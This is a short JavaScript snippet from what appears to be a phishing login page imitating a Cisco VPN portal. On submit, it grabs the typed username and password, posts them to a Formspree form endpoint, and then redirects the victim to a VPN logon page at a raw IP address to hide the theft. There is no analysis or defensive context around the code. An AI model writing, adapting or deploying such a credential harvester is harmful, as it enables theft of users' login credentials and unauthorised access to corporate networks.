    <script>
    function disableButton() {
        try {
            var obj = document.getElementById("submit_button");
            if (obj) {
                obj.disabled = true;
            }
        } catch (e) {
            // Handle error
        }
    }

    function formSubmit(event) {
        event.preventDefault();
        disableButton();
        
        var username = document.getElementById("username").value;
        var password = document.getElementById("password_input").value;
        var formData = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);

        // Envoyer les données à Formspree
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://formspree.io/f/your-form-id", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(formData);

        // Redirection vers une autre page
        window.location.href = "https://185.79.192.62/+CSCOE+/logon.html#form_title_text";
    }

    function set_focus() {
        var name = "username";
        if (!name) {
            name = "Login";
        }
        if (name) {
            var obj = document.getElementById(name);
            if (obj) {
                obj.focus();
            }
        }
    }
    window.onload = set_focus;
    </script>
